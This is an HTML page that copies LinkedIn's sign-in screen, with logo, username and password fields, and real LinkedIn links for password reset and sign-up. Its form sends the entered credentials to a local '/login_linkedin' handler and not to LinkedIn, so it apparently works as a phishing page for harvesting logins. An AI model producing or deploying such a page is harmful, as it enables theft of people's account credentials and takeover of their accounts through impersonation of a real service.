<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linkedin | Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <img src="linkedin_logo.png" alt="linkedin_logo.png">
    <form action="/login_linkedin" method="post">
        <h1>Sign in</h1>
        <p>Stay updated on your professional world</p>
        <input type="text" name="username" id="username" placeholder="Username" required autocomplete="off"><br><br>
        <input type="password" name="password" id="password" placeholder="Password" required autocomplete="off"><br><br>
        <a class="a" href="https://www.linkedin.com/checkpoint/rp/request-password-reset?trk=guest_homepage-basic_nav-header-signin">Forgot password?</a><br><br>
        <button>Sign in</button><br>
    </form>
    <div class="join">
        <p>New to linkedin?&nbsp;&nbsp;<a class="a1" href="https://www.linkedin.com/signup/cold-join?source=guest_homepage-basic_nav-header-signin">join now</a></p>
    </div>

</body>
</html>
